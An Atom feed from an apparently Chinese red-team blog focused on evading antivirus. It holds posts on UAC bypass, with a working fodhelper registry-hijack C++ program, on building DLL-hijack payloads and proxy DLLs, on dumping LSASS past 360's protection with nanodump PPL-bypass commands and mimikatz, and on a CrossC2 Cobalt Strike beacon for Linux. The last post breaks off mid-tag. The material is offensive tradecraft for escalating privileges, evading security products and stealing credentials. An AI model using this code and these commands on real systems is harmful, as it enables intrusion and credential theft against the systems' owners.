<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TPA HACK-NOTE</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-03-03T14:58:36.310Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BypassUAC的多种方式</title>
    <link href="http://example.com/posts/888328195.html"/>
    <id>http://example.com/posts/888328195.html</id>
    <published>2024-02-22T10:51:42.000Z</published>
    <updated>2024-03-03T14:58:36.310Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BypassUAC的多种方式"><a href="#BypassUAC的多种方式" class="headerlink" title="BypassUAC的多种方式"></a>BypassUAC的多种方式</h1><p>在上线遇到低权限用户进行提权时，可以利用系统漏洞，利用土豆系列工具提权到system，同时可以BypassUAC提权到管理员。</p><h2 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h2><p>UAC是微软在 Windows Vista 以后版本引入的一种安全机制，UAC全称是User Account Control直译为“用户帐户控制”，UAC需要用户在执行一些可能会影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员‌密码。</p><p><img src="/image/article/BypassUAC%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F.assets/uacflowchart.png" alt="img"></p><h2 id="什么是BypassUAC"><a href="#什么是BypassUAC" class="headerlink" title="什么是BypassUAC"></a>什么是BypassUAC</h2><p>在触发UAC时，操作系统会创建一个名为consent.exe的进程，该进程通过白名单和用户选择来确定是否提升权限。 请求进程将要提升权限的进程的commandline和程序路径通过LPC(Local Procedure Call)接口传递给appinfo的RAiluanchAdminProcess函数，该函数首先会验证传入程序是否在白名单内同时判断是否弹出UAC窗口，这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程。 通常通过UAC的权限提升需要由用户确认，在不被用户发现的情况下静默的将程序的普通权限提升为管理员权限，从而使程序可以实现一些需要权限的操作被称之为BypassUac。</p><h2 id="image-article-BypassUAC的多种方式"><a href="#image-article-BypassUAC的多种方式" class="headerlink" title="&#x2F;image&#x2F;article&#x2F;BypassUAC的多种方式"></a>&#x2F;image&#x2F;article&#x2F;BypassUAC的多种方式</h2><p>看权限命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br></pre></td></tr></table></figure><h3 id="白名单提权"><a href="#白名单提权" class="headerlink" title="白名单提权"></a>白名单提权</h3><p>有一些系统程序是会直接获取管理员权限同时不出发UAC弹窗的，这类程序被称为白名单程序。 这些程序拥有一个manifest文件该文件本质上是一个XML文件用于标识该程序的配置属性。 拥有autoElevate属性程序和微软签名和白名单会被操作系统认为是可信的。会在启动时就静默提升权限。</p><h4 id="查找白名单程序"><a href="#查找白名单程序" class="headerlink" title="查找白名单程序"></a>查找白名单程序</h4><p>白名单程序一般都在 C:\Windows\System32\ 目录下</p><p>利用微软工具sigcheck进行查询</p><p>下载地址：</p><p><a href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck">https://learn.microsoft.com/zh-cn/sysinternals/downloads/sigcheck</a></p><p>如果程序设置如<code>&lt;autoElevate&gt;true&lt;/autoElevate&gt;</code>时，则是在白名单中</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sigcheck64.exe -m C:\Windows\System32\fodhelper.exe | <span class="built_in">findstr</span> auto</span><br></pre></td></tr></table></figure><p><img src="/image/article/BypassUAC%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E5%BC%8F.assets/image-20240222192648387.png" alt="image-20240222192648387"></p><h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>找一个既在白名单又存在DLL劫持的程序</p><p>写一个上线beacon的DLL进行劫持即可</p><h4 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h4><p>有杀软的情况比较鸡肋360下百分百拦截，火绒WDF其他可以用</p><p>如果键值对HKCU:\Software\Classes\ms-settings\shell\open\command存在，fodhelper会查找HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute,若也存在到则读取HKCU:\Software\Classes\ms-settings\shell\open\command的值然后执行</p><p>C++脚本如下：refer：<a href="https://github.com/supersalted/FodhelperBypassUAC">https://github.com/supersalted/FodhelperBypassUAC</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/subsystem:windows /ENTRY:mainCRTStartup&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HKEY hKey;</span><br><span class="line"></span><br><span class="line">    si.cb = <span class="built_in">sizeof</span>(STARTUPINFO);</span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    <span class="built_in">RegCreateKeyA</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings\\Shell\\open\\command&quot;</span>, &amp;hKey);</span><br><span class="line">    <span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, REG_SZ, (LPBYTE)<span class="string">&quot;cmd.exe&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;cmd.exe&quot;</span>));</span><br><span class="line">    <span class="built_in">RegSetValueExA</span>(hKey, <span class="string">&quot;DelegateExecute&quot;</span>, <span class="number">0</span>, REG_SZ, (LPBYTE)<span class="string">&quot;&quot;</span>, <span class="built_in">sizeof</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span>,(LPSTR)<span class="string">&quot;/c C:\\Windows\\System32\\fodhelper.exe&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, NORMAL_PRIORITY_CLASS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">5000</span>);</span><br><span class="line">    <span class="built_in">RegDeleteTreeA</span>(HKEY_CURRENT_USER, <span class="string">&quot;Software\\Classes\\ms-settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="COM接口"><a href="#COM接口" class="headerlink" title="COM接口"></a>COM接口</h3><p>COM接口也会被360核晶拦截，其他杀软可以过</p><p>在打像WDF可以上线后直接使用Com接口BypassUAC之后添加排除项</p><p>利用工具查看Elevation属性，在Enabled和Auto Approval值都是True才能bypassUAC</p><p>UAC在判断系统进程是否可信，判断依据是PEB结构，因此在使用COM组件提权之前我们将进程信息伪装成可信程序，例如c:\windows\explorer.exe等就能够BypassUAC。参见<a href="https://github.com/0xlane/BypassUAC/blob/master/BypassUAC/main.cpp%E4%B8%AD%E7%9A%84MasqueradePEB">https://github.com/0xlane/BypassUAC/blob/master/BypassUAC/main.cpp中的MasqueradePEB</a></p><p>refer:</p><p><a href="https://github.com/0xlane/BypassUAC/tree/master">https://github.com/0xlane/BypassUAC/tree/master</a></p><p><a href="https://github.com/hfiref0x/UACME">https://github.com/hfiref0x/UACME</a></p><h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>也是鸡肋的办法，需要访问GUI界面</p><p>添加计划任务，并设置开启属性<code>使用最高权限运行</code>，等执行计划任务运行高权限。过程不触发UAC</p><h3 id="Windows自身漏洞"><a href="#Windows自身漏洞" class="headerlink" title="Windows自身漏洞"></a>Windows自身漏洞</h3><h2 id="针对360核晶的BypassUAC"><a href="#针对360核晶的BypassUAC" class="headerlink" title="针对360核晶的BypassUAC"></a>针对360核晶的BypassUAC</h2><p>针对其他一般的杀软BypassUAC随便过，360核晶对COM接口和注册表监控比较严格一般来说无法使用这两种方法绕过。可行的方法：</p><p>1.白名单+DLL劫持</p><p>2.致盲360核晶</p><p>3.RPC加载驱动Kill掉360核晶</p><p>4.可以进GUI界面点点计划任务上线</p>]]></content>
    
    
    <summary type="html">BypassUAC的多种方式</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>MinGW-w64的安装与使用</title>
    <link href="http://example.com/posts/3277396716.html"/>
    <id>http://example.com/posts/3277396716.html</id>
    <published>2024-02-21T06:13:52.000Z</published>
    <updated>2024-03-03T14:43:51.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MinGW-w64的安装与使用"><a href="#MinGW-w64的安装与使用" class="headerlink" title="MinGW-w64的安装与使用"></a>MinGW-w64的安装与使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载地址：</p><p><a href="https://sourceforge.net/projects/mingw-w64/files/mingw-w64/mingw-w64-release/">https://sourceforge.net/projects/mingw-w64/files/mingw-w64/mingw-w64-release/</a></p><p>下翻找到下载</p><p><img src="/image/article/MinGW-w64%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8.assets/image-20240221141514770.png" alt="image-20240221141514770"></p><p>解压到一个目录</p><p><img src="/image/article/MinGW-w64%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8.assets/image-20240221141856730.png" alt="image-20240221141856730"></p><p>将bin目录配置到环境变量</p>]]></content>
    
    
    <summary type="html">MinGW-w64的安装与使用</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="工具使用" scheme="http://example.com/tag/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>挖掘白加黑DLL劫持漏洞</title>
    <link href="http://example.com/posts/3411119311.html"/>
    <id>http://example.com/posts/3411119311.html</id>
    <published>2024-02-21T02:04:39.000Z</published>
    <updated>2024-03-03T14:44:42.090Z</updated>
    
    <content type="html"><![CDATA[<h1 id="挖掘白加黑DLL劫持漏洞"><a href="#挖掘白加黑DLL劫持漏洞" class="headerlink" title="挖掘白加黑DLL劫持漏洞"></a>挖掘白加黑DLL劫持漏洞</h1><p>Tips:</p><p>白程序+黑DLL</p><p>黑DLL需要优先正常DLL目录，并且DLL不在WIndows KnowDLLs列表中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs&quot;</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221102021774.png" alt="image-20240221102021774"></p><p>DLL劫持分为两种：</p><p>1.劫持不存在的DLL</p><p>2.劫持已存在的DLL</p><h2 id="准备测试DLL"><a href="#准备测试DLL" class="headerlink" title="准备测试DLL"></a>准备测试DLL</h2><p>准备一个弹计算器的DLL 运行库MT编译x64和x86版本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//DLL进程装载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        system(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="comment">//DLL线程装载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="comment">//DLL线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="comment">//DLL进程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="劫持不存在的DLL"><a href="#劫持不存在的DLL" class="headerlink" title="劫持不存在的DLL"></a>劫持不存在的DLL</h2><p>这种是最简单的情况</p><p>劫持程序uc.exe</p><p>利用Process Monitor工具 首先添加filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Process name uc.exe</span><br><span class="line">Result is NAME NOT FOUND</span><br><span class="line">Path ends with .dll</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113144776.png" alt="image-20240221113144776"></p><p>返回结果中找到iconv.dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113234544.png" alt="image-20240221113234544"></p><p>其stack调用了LoadLibrary函数</p><blockquote><p><code>LoadLibrary</code>和<code>LoadLibraryEx</code>一个是本地加载，一个是远程加载，如果DLL不在调用的同一目录下，就可以使用<code>LoadLibrary(L&quot;DLL绝对路径&quot;)</code>加载。但是如果DLL内部又调用一个DLL，就需要使用<code>LoadLibraryEx</code>进行远程加载</p></blockquote><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113404722.png" alt="image-20240221113404722"></p><p>在iconv.dll同级目录下都是x64位的，所以替换的也是x64位dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113517102.png" alt="image-20240221113517102"></p><p>替换后启动uc.exe，成功弹出计算器</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221113558921.png" alt="image-20240221113558921"></p><h2 id="劫持已存在的DLL"><a href="#劫持已存在的DLL" class="headerlink" title="劫持已存在的DLL"></a>劫持已存在的DLL</h2><p>还是利用Process Monitor添加filter</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221150006453.png" alt="image-20240221150006453"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Process name uc.exe</span><br><span class="line">Result is SUCCESS</span><br><span class="line">Path begins with D:\UltraCompare</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221145848438.png" alt="image-20240221145848438"></p><p>这里可以采用DLL转发方式，可以利用工具AheadLib+，但是这个工具内联了__asm在VS2022x64下不支持，只能用来生成x86的dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221131153988.png" alt="image-20240221131153988"></p><p>在github上找到了个好用的工具：</p><p><a href="https://github.com/strivexjun/AheadLib-x86-x64">https://github.com/strivexjun/AheadLib-x86-x64</a></p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151226028.png" alt="image-20240221151226028"></p><p>点击Makefile后生成2个文件</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151340085.png" alt="image-20240221151340085"></p><p>VS新建DLL项目导入这两个文件</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151425359.png" alt="image-20240221151425359"></p><p>.asm文件需要设置属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">把 .asm 文件添加到工程一次</span><br><span class="line">右键单击文件-属性-常规-</span><br><span class="line">项类型:自定义生成工具</span><br><span class="line">从生成中排除:否</span><br><span class="line"></span><br><span class="line">然后复制下面命令填入</span><br><span class="line">命令行: ml64 /Fo $(IntDir)%(fileName).obj /c /Cp %(fileName).asm</span><br><span class="line">输出: $(IntDir)%(fileName).obj;%(Outputs)</span><br><span class="line">链接对象: 是</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151535574.png" alt="image-20240221151535574"></p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151544478.png" alt="image-20240221151544478"></p><p>之后运行库改MT，开始修改代码新增弹计算器的代码</p><p>老哥在生成的代码里加了新建线程执行，避免了白加黑CS的死锁问题</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221151928771.png" alt="image-20240221151928771"></p><p>之后又改了转发文件的代码转发到同目录的zlib1Org.dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152026911.png" alt="image-20240221152026911"></p><p>因为找不到shlwapi.h文件一些API找不到标识符</p><p>在framework.h中添加#include &lt;shlwapi.h&gt;</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152141898.png" alt="image-20240221152141898"></p><p>可以正常编译了，直接编译DLL</p><p>将编译好的DLL改名zlib1.dll原来的DLL改名zlib1Org.dll</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152353758.png" alt="image-20240221152353758"></p><p>启动uc.exe 成功弹出计算器</p><p><img src="/image/article/%E6%8C%96%E6%8E%98%E7%99%BD%E5%8A%A0%E9%BB%91DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E.assets/image-20240221152458563.png" alt="image-20240221152458563"></p>]]></content>
    
    
    <summary type="html">挖掘白加黑DLL劫持漏洞</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>360核晶下的dumplsass</title>
    <link href="http://example.com/posts/666266413.html"/>
    <id>http://example.com/posts/666266413.html</id>
    <published>2024-02-20T14:40:21.000Z</published>
    <updated>2024-03-03T14:58:50.257Z</updated>
    
    <content type="html"><![CDATA[<h1 id="360核晶下的dumplsass"><a href="#360核晶下的dumplsass" class="headerlink" title="360核晶下的dumplsass"></a>360核晶下的dumplsass</h1><h2 id="无PPL"><a href="#无PPL" class="headerlink" title="无PPL"></a>无PPL</h2><p>测试环境为Win10 全程开启360核晶</p><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224359620.png" alt="image-20240220224359620"></p><p>在免杀上线beacon后利用nanodump BOF直接dump</p><p>工具地址：<a href="https://github.com/fortra/nanodump">https://github.com/fortra/nanodump</a></p><p>需要注意只有x64的免杀马才能用nanodump</p><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221001840948.png" alt="image-20240221001840948"></p><p>CS下载到本地，若未指定–valid，需要先还原签名</p><p>ps：一开始以为PPL的原因解密时报错LSA </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./restore_signature WINDOWS-10_1708444406_lsass.dmp</span><br></pre></td></tr></table></figure><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002103881.png" alt="image-20240221002103881"></p><p>mimikatz解密</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump WINDOWS-10_1708444406_lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240221002435120.png" alt="image-20240221002435120"></p><h2 id="有PPL"><a href="#有PPL" class="headerlink" title="有PPL"></a>有PPL</h2><p>Win10有PPL进程保护 能dump解密不了 会报LSA的错误</p><p><img src="/image/article/360%E6%A0%B8%E6%99%B6%E4%B8%8B%E7%9A%84dumplsass.assets/image-20240220224102918.png" alt="image-20240220224102918"></p><p>nanodump中自带了PPL绕过可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nanodump_ppl_dump -v -w C:\Windows\Temp\lsass.dmp</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nanodump_ppl_medic -v -w C:\Windows\Temp\lsass.dmp</span><br></pre></td></tr></table></figure><p>其他绕过方式可以参考这篇文章：</p><p><a href="https://tttang.com/archive/1743/">https://tttang.com/archive/1743/</a></p>]]></content>
    
    
    <summary type="html">360核晶下的dumplsass</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/category/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tag/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>利用CrossC2插件Linux上线CS</title>
    <link href="http://example.com/posts/3584873491.html"/>
    <id>http://example.com/posts/3584873491.html</id>
    <published>2024-02-20T10:30:08.000Z</published>
    <updated>2024-03-03T14:57:55.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>利用CrossC2插件解决Linux无法上线CobaltStrike</p><p><strong>插件地址</strong></p><p><a href="https://github.com/gloxec/CrossC2">https://github.com/gloxec/CrossC2</a></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="下载需要的CNA以及CS客户端类型"><a href="#下载需要的CNA以及CS客户端类型" class="headerlink" title="下载需要的CNA以及CS客户端类型"></a>下载需要的CNA以及CS客户端类型</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220184818465.png" alt="image-20231220184818465"></p><h3 id="配置CNA文件"><a href="#配置CNA文件" class="headerlink" title="配置CNA文件"></a>配置CNA文件</h3><p>$CC2_PATH是插件的绝对路径</p><p>$CC2_BIN 是配置客户端类型</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220184956818.png" alt="image-20231220184956818"></p><p>根据路径修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$CC2_PATH = &quot;D:\\TPA\\CS CNA\\CrossC2\\&quot;; # &lt;-------- fix</span><br><span class="line">$CC2_BIN = &quot;genCrossC2.exe&quot;;</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220192032101.png" alt="image-20231220192032101"></p><h3 id="下载服务端"><a href="#下载服务端" class="headerlink" title="下载服务端"></a>下载服务端</h3><p>下载teamserver下的<code>.cobaltstrike.beacon_keys</code>文件到本地</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220195812077.png" alt="image-20231220195812077"></p><h3 id="创建CrossC2-Listener"><a href="#创建CrossC2-Listener" class="headerlink" title="创建CrossC2 Listener"></a>创建CrossC2 Listener</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220195705966.png" alt="image-20231220195705966"></p><p>进行响应配置</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200043925.png" alt="image-20231220200043925"></p><p>点击build，看Log执行了成功生成了<code>t_c22.out</code>和<code>t_c22.out.lib</code></p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200143248.png" alt="image-20231220200143248"></p><p>在CS的客户端目录进行查看</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220200348667.png" alt="image-20231220200348667"></p><h3 id="上线Linux机器"><a href="#上线Linux机器" class="headerlink" title="上线Linux机器"></a>上线Linux机器</h3><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220212746796.png" alt="image-20231220212746796"></p><p>选择C2的监听器，之后执行curl命令</p><p><img src="/image/article/%E5%88%A9%E7%94%A8CrossC2%E6%8F%92%E4%BB%B6Linux%E4%B8%8A%E7%BA%BFCS.assets/image-20231220212847752.png" alt="image-20231220212847752"></p><p>到这里来说应该上线了，但是没有很看了很多资料文章无法解决，到这里采用第二种方式不用GUI插件了（还是命令好使）</p><h3 id="命令生成上线"><a href="#命令生成上线" class="headerlink" 